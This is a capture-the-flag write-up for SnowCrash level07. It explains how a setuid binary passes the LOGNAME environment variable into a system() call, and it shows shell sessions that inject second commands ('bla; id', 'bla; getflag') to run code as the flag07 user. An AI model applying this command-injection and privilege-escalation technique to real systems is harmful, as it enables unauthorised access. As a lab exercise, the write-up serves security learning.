# writeup level07


In this level again we hace suid(setuid) file 
```
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```
After  reverse engineering the  file level07



![BinaryNinja](https://cdn.discordapp.com/attachments/1164485225875783701/1184497717511204874/image.png?ex=658c3076&is=6579bb76&hm=8e2726c399fd8084a94d327ac6f002d887f21a8d4a5cf4c8713ac14c7630e622&)


# Explain the code:
`asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));`: this line allocates memory for the string "/bin/echo %s " where %s is a placeholder that will be replaced by the value obtained from the LOGNAME environment variable using getenv("LOGNAME"). and then in the next line `return system(var_1c);` executes the command stored in var_1c using the system function. The command executed will be /bin/echo <value of LOGNAME>

source:
[asprintf](https://linux.die.net/man/3/asprintf) 

# Exploit 

To exploiting this is easy, we can simply inject the `LOGNAME` variable with the desired value. In this case, we can perform command injection, enabling us to insert and execute commands as needed.

So the exploit is : 

```
level07@SnowCrash:~$ export LOGNAME="bla; ls"
level07@SnowCrash:~$ ./level07 
bla
ls: cannot open directory .: Permission denied
level07@SnowCrash:~$ export LOGNAME="bla; id"
level07@SnowCrash:~$ ./level07 
bla
uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
level07@SnowCrash:~$ export LOGNAME="bla; getflag"
level07@SnowCrash:~$ ./level07 
bla
Check flag.Here is your token : #######################
```

